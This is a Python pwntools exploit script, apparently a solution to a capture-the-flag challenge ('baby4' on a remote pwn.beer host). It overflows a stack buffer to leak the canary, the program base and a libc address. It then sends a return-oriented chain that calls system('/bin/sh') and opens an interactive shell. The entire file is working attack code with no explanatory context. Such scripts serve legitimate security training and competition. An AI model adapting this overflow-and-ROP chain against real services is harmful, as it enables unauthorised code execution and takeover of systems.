from pwn import *

#p=process('./baby4')
p=remote('baby-01.pwn.beer',10004)
e=ELF('./baby4')

sla = lambda x,y : p.sendlineafter(x,y)
ru = lambda x : p.recvuntil(x)
rl = lambda : p.recvline()

puts_plt = e.plt['puts']
puts_got = e.got['puts']
main = 0xb93
pd=0xd73
ps=0xd71
ret=0x3e0

#[1]LEAK CANARY
sla('<-- ',"A"*0x48+"B")
ru("A"*0x48+"B")
canary = u64("\x00"+rl()[:7])
success("canary: "+hex(canary))

#[2]LEAK CB
sla('<-- ',"A"*0x50)
ru("A"*0x50)
cb = u64(rl()[:-1]+'\x00'*2)-0xd10
puts_plt += cb
puts_got += cb
main += cb
pd += cb
ps += cb
ret += cb
success("codebase: "+hex(cb))

#[3]LEAK LIBC
payload = "A"*0x48 + p64(canary) + "B"*8
payload += p64(pd)+p64(puts_got)+p64(puts_plt)
payload += p64(ret)+p64(ps)+p64(0)+p64(0)+p64(main)
sla('<-- ',payload)
sla('<-- ','')

lb = u64(rl()[:-1]+'\x00'*2) - 0x809c0
system = lb + 0x4f440
binsh = lb+ 0x1b3e9a
success("libcbase: "+hex(lb))

#[4]EXPLOIT
payload = "A"*0x48 + p64(canary) + "B"*8
payload += p64(ret)+p64(pd)+p64(binsh)+p64(system)
sla('<-- ',payload)
sla('<-- ','')

p.interactive()

